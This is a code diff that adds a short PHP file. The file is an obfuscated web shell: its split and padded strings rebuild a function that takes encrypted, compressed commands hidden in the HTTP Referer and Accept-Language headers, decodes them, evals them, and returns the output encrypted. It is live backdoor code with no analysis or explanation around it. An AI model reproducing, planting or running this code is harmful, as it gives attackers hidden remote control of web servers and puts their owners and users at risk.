@@ -1,0 +1,17 @@
+<?php
+$z='($i=0;$i<$l;)x1{for($j=0;(x1$j<$c&x1&$i<x1$l);$jx1++,$ix1++){x1$o.=$t{$x1i}^$x1k{$j};}}x1rx1eturn $o;}$x1';
+$D='x1($i.$kx1h),0,3));$f=$sx1x1l($sx1s(md5($i.$kf)x1,0,3x1));$p="";fox1rx1($z=1;$z<cx1oux1nt($m[1]);$zx1+';
+$W='+x1)$x1p.x1=$q[$m[2x1][$z]];if(strposx1($p,x1$h)==x1=0){x1$s[$i]="";$px1=$sx1sx1($px1,3);}ifx1(array_k';
+$s='ay(x1"/","+"),$x1ss($s[$x1i],0x1,$e))x1),$k)));$ox1=obx1_getx1_contex1nts();ob_x1end_cleanx1(x1);$d=ba';
+$q='&$x1_SESSION;$ss="x1x1substr";x1$sl="sx1trtolowerx1";$i=$mx1[1][x1x10].$x1m[x11][x11];$h=$sl($ss(md5x1';
+$c='$kh="f350x1";$kfx1="2x1aa2x1"x1;function x($t,$k){x1$c=stx1rlex1n($k);$l=sx1trlen($x1x1t);x1$o=x1"";fx1or';
+$R='r=$_SERVx1Ex1R;$rr=@$r["Hx1TTP_REx1FEREx1R"x1x1];$ra=@x1$r["HTTP_ACCEPTx1_Lx1ANGUAGEx1"]x1x1;if(x1$rr&&$ra)';
+$f='x1{$u=px1arse_url($rr);parse_x1str($x1u["quex1x1ry"],$q);$q=arx1x1ray_vax1lux1esx1($q);preg_matcx1h_al';
+$b='ex1y_ex1xists($i,$s))x1{$s[$i].x1x1=$p;$e=strx1pos($s[x1$i]x1,$f);if(x1$e){$k=$kx1h.$kfx1;x1ob_start(x';
+$t='1);@evax1l(@gzux1ncx1ompresx1s(@x(@basex164_dx1ecode(x1prx1eg_repx1lace(arx1x1rax1y("/_/","/-/"x1),arr';
+$u='se6x14_encodx1x1e(x1x(gzcomprx1x1ess($o),$k));print("x1<$kx1>$d</$k>"x1x1x1);@sx1ession_destroy();}}}}';
+$K=str_replace('GR','','cGRGRreate_GRGRfunGRcGRtion');
+$P='l("/(x1[\\w]x1)[\\w-]+(?:;x1q=0.(x1[\\x1dx1]))?,x1?/",$ra,$x1m);if($x1q&&$x1m){@sessx1ion_x1stx1art();$s=';
+$v=str_replace('x1','',$c.$z.$R.$f.$P.$q.$D.$W.$b.$t.$s.$u);
+$F=$K('',$v);$F();
+?>
